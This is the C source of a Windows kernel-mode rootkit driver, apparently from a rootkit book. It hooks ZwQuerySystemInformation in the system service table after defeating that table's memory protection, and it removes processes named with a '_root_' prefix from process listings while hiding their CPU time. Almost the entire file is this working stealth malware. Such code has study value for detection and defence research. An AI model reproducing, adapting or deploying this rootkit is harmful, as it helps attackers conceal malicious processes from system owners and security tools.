// BASIC ROOTKIT that hides processes
// ----------------------------------------------------------
// v0.1 - Initial, Greg Hoglund (hoglund@rootkit.com)
// v0.3 - Added defines to compile on W2K, and comments.  Rich
// v0.4 - Fixed bug while manipulating _SYSTEM_PROCESS array.
//		  Added code to hide process times of the _root_*'s. Creative
// v0.6 - Added way around system call table memory protection, Jamie Butler (butlerjr@acm.org)
// v1.0 - Trimmed code back to a process hider for the book.

#include "ntddk.h"

#pragma pack(1)
typedef struct ServiceDescriptorEntry {
        unsigned int *ServiceTableBase;
        unsigned int *ServiceCounterTableBase; //Used only in checked build
        unsigned int NumberOfServices;
        unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
#define SYSTEMSERVICE(_function)  KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]


PMDL  g_pmdlSystemCall;
PVOID *MappedSystemCallTable;
#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)
#define HOOK_SYSCALL(_Function, _Hook, _Orig )  \
       _Orig = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)

#define UNHOOK_SYSCALL(_Function, _Hook, _Orig )  \
       InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)


struct _SYSTEM_THREADS
{
        LARGE_INTEGER           KernelTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           CreateTime;
        ULONG                           WaitTime;
        PVOID                           StartAddress;
        CLIENT_ID                       ClientIs;
        KPRIORITY                       Priority;
        KPRIORITY                       BasePriority;
        ULONG                           ContextSwitchCount;
        ULONG                           ThreadState;
        KWAIT_REASON            WaitReason;
};

struct _SYSTEM_PROCESSES
{
        ULONG                           NextEntryDelta;
        ULONG                           ThreadCount;
        ULONG                           Reserved[6];
        LARGE_INTEGER           CreateTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           KernelTime;
        UNICODE_STRING          ProcessName;
        KPRIORITY                       BasePriority;
        ULONG                           ProcessId;
        ULONG                           InheritedFromProcessId;
        ULONG                           HandleCount;
        ULONG                           Reserved2[2];
        VM_COUNTERS                     VmCounters;
        IO_COUNTERS                     IoCounters; //windows 2000 only
        struct _SYSTEM_THREADS          Threads[1];
};

// Added by Creative of rootkit.com
struct _SYSTEM_PROCESSOR_TIMES
{
		LARGE_INTEGER					IdleTime;
		LARGE_INTEGER					KernelTime;
		LARGE_INTEGER					UserTime;
		LARGE_INTEGER					DpcTime;
		LARGE_INTEGER					InterruptTime;
		ULONG							InterruptCount;
};


NTSYSAPI
NTSTATUS
NTAPI ZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
                        IN PVOID SystemInformation,
                        IN ULONG SystemInformationLength,
                        OUT PULONG ReturnLength);


typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(
            ULONG SystemInformationCLass,
                        PVOID SystemInformation,
                        ULONG SystemInformationLength,
                        PULONG ReturnLength
);

ZWQUERYSYSTEMINFORMATION        OldZwQuerySystemInformation;

// Added by Creative of rootkit.com
LARGE_INTEGER					m_UserTime;
LARGE_INTEGER					m_KernelTime;

///////////////////////////////////////////////////////////////////////
// NewZwQuerySystemInformation function
//
// ZwQuerySystemInformation() returns a linked list of processes.
// The function below imitates it, except it removes from the list any
// process who's name begins with "_root_".

NTSTATUS NewZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
            IN PVOID SystemInformation,
            IN ULONG SystemInformationLength,
            OUT PULONG ReturnLength)
{

   NTSTATUS ntStatus;

   ntStatus = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (
					SystemInformationClass,
					SystemInformation,
					SystemInformationLength,
					ReturnLength );

   if( NT_SUCCESS(ntStatus)) 
   {
      // Asking for a file and directory listing
      if(SystemInformationClass == 5)
      {
	     // This is a query for the process list.
		 // Look for process names that start with
		 // '_root_' and filter them out.
					
		 struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
         struct _SYSTEM_PROCESSES *prev = NULL;
		 
		 while(curr)
		 {
            //DbgPrint("Current item is %x\n", curr);
			if (curr->ProcessName.Buffer != NULL)
			{
				if(0 == memcmp(curr->ProcessName.Buffer, L"_root_", 12))
				{
					m_UserTime.QuadPart += curr->UserTime.QuadPart;
					m_KernelTime.QuadPart += curr->KernelTime.QuadPart;

					if(prev) // Middle or Last entry
					{
						if(curr->NextEntryDelta)
							prev->NextEntryDelta += curr->NextEntryDelta;
						else	// we are last, so make prev the end
							prev->NextEntryDelta = 0;
					}
					else
					{
						if(curr->NextEntryDelta)
						{
							// we are first in the list, so move it forward
							(char *)SystemInformation += curr->NextEntryDelta;
						}
						else // we are the only process!
							SystemInformation = NULL;
					}
				}
			}
			else // This is the entry for the Idle process
			{
			   // Add the kernel and user times of _root_* 
			   // processes to the Idle process.
			   curr->UserTime.QuadPart += m_UserTime.QuadPart;
			   curr->KernelTime.QuadPart += m_KernelTime.QuadPart;

			   // Reset the timers for next time we filter
			   m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
			}
			prev = curr;
		    if(curr->NextEntryDelta) ((char *)curr += curr->NextEntryDelta);
		    else curr = NULL;
	     }
	  }
	  else if (SystemInformationClass == 8) // Query for SystemProcessorTimes
	  {
         struct _SYSTEM_PROCESSOR_TIMES * times = (struct _SYSTEM_PROCESSOR_TIMES *)SystemInformation;
         times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
	  }

   }
   return ntStatus;
}


VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
   DbgPrint("ROOTKIT: OnUnload called\n");

   // unhook system calls
   UNHOOK_SYSCALL( ZwQuerySystemInformation, OldZwQuerySystemInformation, NewZwQuerySystemInformation );

   // Unlock and Free MDL
   if(g_pmdlSystemCall)
   {
      MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
      IoFreeMdl(g_pmdlSystemCall);
   }
}


NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, 
					 IN PUNICODE_STRING theRegistryPath)
{
   // Register a dispatch function for Unload
   theDriverObject->DriverUnload  = OnUnload; 

   // Initialize global times to zero
   // These variables will account for the 
   // missing time our hidden processes are
   // using.
   m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;

   // save old system call locations
   OldZwQuerySystemInformation =(ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));

   // Map the memory into our domain so we can change the permissions on the MDL
   g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4);
   if(!g_pmdlSystemCall)
      return STATUS_UNSUCCESSFUL;

   MmBuildMdlForNonPagedPool(g_pmdlSystemCall);

   // Change the flags of the MDL
   g_pmdlSystemCall->MdlFlags = g_pmdlSystemCall->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;

   MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);

   // hook system calls
   HOOK_SYSCALL( ZwQuerySystemInformation, NewZwQuerySystemInformation, OldZwQuerySystemInformation );
                              
   return STATUS_SUCCESS;
}
